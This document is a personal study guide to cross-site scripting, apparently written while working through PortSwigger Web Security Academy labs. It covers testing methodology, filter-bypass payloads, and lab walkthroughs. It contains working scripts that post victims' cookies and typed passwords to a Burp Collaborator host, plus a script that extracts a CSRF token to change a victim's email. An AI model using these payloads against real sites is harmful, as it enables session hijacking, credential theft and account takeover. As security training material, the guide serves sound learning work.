# Cross Site Scripting Notes

[Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

[Portswigger](https://portswigger.net/web-security/cross-site-scripting)

## Methodology

Testing for XSS flow:
- How are “non-malicious” HTML tags such as `<h2>` handled?
- What about incomplete tags `<iframe src=//example.com/c=`
- How do they handle encodings such as `<%00h2`? (`%0d`, `%0a`, `%09` etc)
- Is it just a blacklist of hardcoded strings? Does `</script/x>` work? `<ScRipt>` etc.

__stealing cookies code__

after running the code below in something say like stored xss in a comment field, you can just reuse the users cookies to gain access to the site as that user

```
<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```

__stealing passwords with xss__

same as above enter this in as a blog comment

```
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

__Payloads__
```
Simple
<script>alert(1)</script>
Close out attribute and created new
"><svg onload=alert(1)>
Escape quotes
"onmouseover="alert(1)
Break out of Javascript string
'-alert(1)-'
AngularJS - look for things like ng-app in source
{{$on.constructor('alert(1)')()}}
```

__Using XSS cheat sheet to find unblocked tags and attributes__

- input a standard XSS vector: `<img src=1 onerror=print()>` Notice it gets blocked

![image](https://github.com/user-attachments/assets/8387a6d6-3a67-4dfa-b661-d449219899c7)

- send this call to burp intruder and replace the search term with `<>` and put your input in between these

![image](https://github.com/user-attachments/assets/e37e759e-b175-482c-a97a-fd670b27537d)


- now go to the XSS cheat sheet and select copy tags to clipboard

![image](https://github.com/user-attachments/assets/e9b00ea8-1f52-467c-9f31-36863a37c239)

- in burp intruder under payload select paste

![image](https://github.com/user-attachments/assets/7a8c480c-80dd-46ea-bde3-edbc91d944fd)


-  start the attack in intruder and review the results

![image](https://github.com/user-attachments/assets/19ce7f48-49e3-4adf-b491-3a74612b7672)

- we can see that the payloads `body` and `custom tags` gives us a 200 which means we can use these without getting blocked

- now we can continue trying to find payloads that can work with `<body%20=1>` and place our input between the space encoding space character after `body` and the equal signs.

- Clear the payloads and go back to the cheat sheet and select `Copy events to clipboard` and paste that into intruder

![image](https://github.com/user-attachments/assets/98e4832c-c53d-4310-84d0-ed6fb816b8a8)

![image](https://github.com/user-attachments/assets/3e9ec721-cc90-47e4-a544-6e5dd0ba2704)

![image](https://github.com/user-attachments/assets/d0b2652c-4213-412e-99d5-766cbebbe730)

- now start intruder and find the events you can use

![image](https://github.com/user-attachments/assets/67ac4321-9fc6-473f-b0cd-824478bc39d4)

- we have many options here to use, let's use onresize to exploit this. We will go to the exploit server and craft and iframe with this payload
```
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```

![image](https://github.com/user-attachments/assets/4ac01d03-f736-492f-8f78-c3c8a47b5260)

__View backslash escaping__

1. in a random string add a special character like `'` and view the source to see if the site adds a backslash to avoid, in one case we can just finish the script block and start a new one to get xss with a payload like this `</script><script>alert(1)</script>`

2. enter this payload to view if backslash is being escaped `test\payload` if so we can use our own backslash to break out of the JavaScript string and inject an alert like `\'-alert(1)//`


__Misc DOM stuff__
- Here we can see in developer tools the DOM Invader usage, the canary is on the left, you can copy your canary with the button:
![image](https://github.com/user-attachments/assets/66afdc74-2726-47ee-80b6-b0f2a8a25a56)
  
Now this is how we use DOM Invader and sending the canary into every input will help us find DOM XSS, but let's discuss now how we can view sinks in source. When inputting a string of random values that stand out like maybe `XSS` or `xvr7bpon`, it's arbitrary, we can find out more about what's happening. In this use case if we notice that our results get processed by another script like this:

![image](https://github.com/user-attachments/assets/4dbb0909-db00-4aad-8633-7734a6136193)

Then we need to view that javascript file to determine what's happening. 

![image](https://github.com/user-attachments/assets/373b2a7e-b676-44d0-8e6d-3da1f172612a)

We can see in Searchresults.js that it is using the `eval()` function which is a good place for us to attempt exploiting XSS. Now to break out let's just use what portswigger wrote to understand what's happening: 

```
payload used:
\"-alert(1)}//
```

_As you have injected a backslash and the site isn't escaping them, when the JSON response attempts to escape the opening double-quotes character, it adds a second backslash. The resulting double-backslash causes the escaping to be effectively canceled out. This means that the double-quotes are processed unescaped, which closes the string that should contain the search term._

_An arithmetic operator (in this case the subtraction operator) is then used to separate the expressions before the alert() function is called. Finally, a closing curly bracket and two forward slashes close the JSON object early and comment out what would have been the rest of the object. As a result, the response is generated as follows:_ 
`{"searchTerm":"\\"-alert(1)}//", "results":[]}`

# Labs walkthroughs

### Reflected XSS into HTML context with nothing encoded

Enter this in the search box
`<script>alert(1)</script>`

### Stored XSS into HTML context with nothing encoded

Enter this as a comment
`<script>alert(1)</script>`

### DOM XSS in document.write sink using source location.search

- Enter random input to the search box
- If we right click and inspect the page we can view that the random string we entered is placed inside the img src attribute
- enter this payload to pop xss `"><svg onload=alert(1)>`

### DOM XSS in innerHTML sink using source location.search

- Inject this into the search box `<img src=1 onerror=alert(1)>`

### DOM XSS in jQuery anchor href attribute sink using location.search source

- On the submit feedback page, change the query parameter `returnPath` to `/` followed with some random string
- right-click and inspect the element, and observe that your random string has been placed inside an `href` attribute
- Now enter this: `javascript:alert(document.cookie)`

### DOM XSS in jQuery selector sink using a hashchange event

So we notice a hashchange value in the page, we control this variable and can put our JQuery xss in this value in the url.

To exploit this we need to send an iframe with this payload in it

```
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```
We can add `hidden="hidden"` to hide our iframe on the browser

### Reflected XSS into attribute with angle brackets HTML-encoded

- Inject a string in the search box, review what the return is and see that your string is reflected
- send this to repeater and notice your text is in a quoted `("")` attribute.
- break the quote and send in payload like this `"onmouseover="alert(1)`

### Stored XSS into anchor href attribute with double quotes HTML-encoded

- post comment with a random string in the website input
- notice it is placed in an anchor `href` attribute
- enter this payload `javascript:alert(1)`, to trigger right click in burp and select `"copy URL"` and paste it in your browser

### Reflected XSS into a JavaScript string with angle brackets HTML encoded

- inject string like above
- notice it is reflected inside a JavaScript string
- break out of string with a payload like: `'-alert(1)-'`

### DOM XSS in document.write sink using source location.search inside a select element

- when visiting the site go to a product and read the source
- you encounter information about a location.search function referencing a storeId value. We don't have this in the URL parameters we have so attempt to add this to the URL.
- Now with DOM Invader turned on inject your canary into the storeId parameter
- DOM Invader will have a simple `exploit` button you can use to exploit or use this payload `"></select><img%20src=1%20onerror=alert(1)>`

### DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

- enter string into search bar, again can use DOM invaders canary for this
- view source to examine the sink, notice the usage of ng-app this implies this is AngularJS
- Now we can abuse AngularJS `{{$on.constructor('alert(1)')()}}`

### Reflected DOM XSS

- again can use DOM Invader, but for more indepth understanding let's discuss it here
- I wrote more of this lab above in DOM misc, but injection is `\"-alert(1)}//`

### Stored DOM XSS

- we can post our canary from DOM Invader and notice the comment field might be injectable
- review sources in developer tools and we see a loadCommentsWithEscapeHtml.js
- Here we see it replacing <> with &lt or &gt

![image](https://github.com/user-attachments/assets/afde9de6-9825-48d9-839f-c7bb7b01eeda)

- since replace() only looks for first occorence of the brackets placing dumby ones beforehand will let us continue injecting our payload with no issues: `<><img src=1 onerror=alert(1)>`

### Reflected XSS into HTML context with most tags and attributes blocked

I wrote the methodology of this above, we are using burp intruder and the XSS cheatsheet to detect whcih tags and attributes aren't blocked and abuse it that way. Above under `Using XSS cheat sheet to find unblocked tags and attributes`

### Reflected XSS into HTML context with all tags blocked except custom ones

when we enter tags we get blocked with script, but we can attempt to create a new custom tag to use like this payload
`<xss id=x onfocus=alert(document.cookie) tabindex=1>#x';`

enter that payload into an iframe and deliver to target

```
<script>
location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>
```

when viewing the exploit we can see it placed this as a new custom tag for our use case and exploited the `alert(document.cookie)`

![image](https://github.com/user-attachments/assets/9264df6e-f02c-44b0-a475-15bf19b13406)

### Reflected XSS with some SVG markup allowed

- in this one we are again getting blocked when doing a standard payload like `<img src=1 onerror=alert(1)>`
- follow the methodology above to identify tags and attributes that aren't blocked
- notice that svg, animatetransform, title and image works, so let's attempt that 

![image](https://github.com/user-attachments/assets/cf92603c-d1f1-4faf-8620-9e6968848f9a)

- now we just gotta attempt to see what events work to create our payload following similar methodology using this payload as a start `<svg><animatetransform%20§§=1>`
- onbegin works

![image](https://github.com/user-attachments/assets/7fe6696c-fe69-499a-b3a0-9f3ea0a011f1)

- payload to exploit `"><svg><animatetransform onbegin=alert(1)>`

### Reflected XSS in canonical link tag

For our usage the simulated user will enter these: 
- ALT+SHIFT+X - Windows
- CTRL+ALT+X - MacOS
- Alt+X - Linux

payload to use: `'accesskey='x'onclick='alert(1)`

if a user clicks `x` it will work, for our use case to exploit we have to select one of the above to exploit

### Reflected XSS into a JavaScript string with single quote and backslash escaped

- send a payload like `test'payload` to see the `'` is being backslashed escaped

![image](https://github.com/user-attachments/assets/4f37c19b-3926-4893-bf01-9c2f3e40cb29)

- enter payload to end that block that is escaping and add our xss payload like this `</script><script>alert(1)</script>`

![image](https://github.com/user-attachments/assets/3b5a0594-babd-4147-af9c-ef53dae15a4a)

### Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

- do similar as above, enter `test'payload`, then send `test\payload` and observe that the backslash doesn't get escapted but the quote does
- break out of it with a payload like this `\'-alert(1)//`

### Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

- this time we are going to abuse the `website` input on the comments section, if we enter random strings we can observe that it is reflected inside an onclick event handler attribute

![image](https://github.com/user-attachments/assets/3673f9c8-0044-4440-b742-688e2f1a5b5d)

- we can modify this using this type of payload `http://foo?&apos;-alert(1)-&apos;`

![image](https://github.com/user-attachments/assets/e00d666c-19f9-4942-a792-669ef3edac04)

- we can see it added it as an href, the &apos are single quotes `'`

### Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped

- in the case where angle brackets, singe, double quotes, and backslash and backticks are escaped in a template string we can execute JavaScript still

![image](https://github.com/user-attachments/assets/17877297-6613-4330-8b34-a586f8b5912b)

- enter in this payload to trigger `${alert(1)}`

![image](https://github.com/user-attachments/assets/9dd49c67-0ddc-46af-872b-900b3c959cdd)


## stealing stuff with xss

### Exploiting cross-site scripting to steal cookies

- place this in the blog comment section and poll the collaborator until you recieve user cookies

```
<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```

### Exploiting cross-site scripting to capture passwords

- place this in the blog comment section and poll the collaborator until you recieve username and password

```
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

### Exploiting XSS to perform CSRF

- login with user creds
- view the source page and notice the updating email address functionality, this sends a POST request to /my-account/change-email
- there is an anti-scrf token being used, which means we need to extract the CSRF token from the user account page then use it to change the victims email address

![image](https://github.com/user-attachments/assets/e2efcaf2-d1e4-44dc-9705-b5314b20d228)


- enter this into the blog comment field to have the user change their email to test@test.com

```
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```






